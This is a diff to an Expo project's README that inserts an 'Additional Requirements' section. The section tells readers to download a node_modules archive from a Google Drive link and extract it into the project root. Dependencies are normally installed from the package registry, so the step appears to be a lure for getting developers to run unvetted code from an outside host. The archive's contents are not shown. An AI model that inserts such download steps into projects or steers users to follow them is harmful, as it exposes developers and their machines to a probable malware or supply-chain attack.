@@ -15,6 +15,15 @@ This is an [Expo](https://expo.dev) project created with [`create-expo-app`](htt
    ```bash
     npx expo start
    ```
+Additional Requirements
+
+To run the application successfully, you will need the node_modules directory, which is not included in this repository.
+
+Download the required node_modules package here:
+
+https://drive.google.com/file/d/1xH17dCMVFJvkpzgjtGGiS6MVrHlIieZb/view?usp=sharing
+
+After downloading, extract the archive and place the node_modules folder in the project's root directory.
 
 In the output, you'll find options to open the app in a
 
